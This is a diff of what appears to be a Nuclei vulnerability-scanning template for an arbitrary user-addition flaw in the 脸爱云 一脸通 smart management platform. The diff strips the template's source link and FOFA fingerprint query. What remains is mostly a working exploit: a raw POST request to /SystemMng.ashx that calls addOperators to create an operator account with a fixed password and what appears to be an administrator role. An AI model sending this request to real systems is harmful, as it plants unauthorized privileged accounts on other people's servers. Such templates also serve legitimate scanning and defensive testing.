@@ -3,12 +3,8 @@ info:
   name: 脸爱云 一脸通智慧管理平台任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ykg19ncfqcs5obtv'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ykg19ncfqcs5obtv
-    fofa: title=="欢迎使用脸爱云 一脸通智慧管理平台"
 http:
 - raw:
   - 'POST /SystemMng.ashx HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     operatorName=dudesuite&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
